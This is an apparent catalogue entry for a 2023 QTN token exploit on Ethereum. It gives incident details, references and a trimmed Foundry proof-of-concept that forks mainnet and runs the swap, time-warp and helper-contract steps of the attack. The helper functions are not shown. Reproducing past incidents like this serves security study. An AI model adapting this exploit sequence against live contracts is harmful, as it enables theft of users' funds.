# [?] - QTNToken - business logic flaw

## Summary
Severity: Unknown
Chain: Ethereum
Component: QTN
Published: 2023-01-18
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-01/QTN_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~2ETH
References:
- https://twitter.com/BlockSecTeam/status/1615625901739511809
- https://etherscan.io/tx/0x37cb8626e45f0749296ef080acb218e5ccc7efb2ae4d39c952566dc378ca1c4c
- https://etherscan.io/tx/0xfde10ad92566f369b23ed5135289630b7a6453887c77088794552c2a3d1ce8b7

```solidity
contract ContractTest is Test {
    IERC20 QTN = IERC20(0xC9fa8F4CFd11559b50c5C7F6672B9eEa2757e1bd);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Uni_Router_V2 Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0xA8208dA95869060cfD40a23eb11F2158639c829B);
    address[] contractList;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 16_430_212);
        cheats.label(address(QTN), "QTN");
        cheats.label(address(WETH), "WETH");
        cheats.label(address(Router), "Router");
        cheats.label(address(Pair), "Pair");
    }

    function testExploit() public {
        address(WETH).call{value: 2 ether}("");
        WETHToQTN();
        cheats.warp(block.timestamp + 500); // _timeLimitFromLastBuy 5 minutes
        QTNContractFactory();
        cheats.warp(block.timestamp + 500);
        QTNContractBack();
        QTNToWETH();

        emit log_named_decimal_uint(
            "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
        );
    }

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-01/QTN_exp.sol_
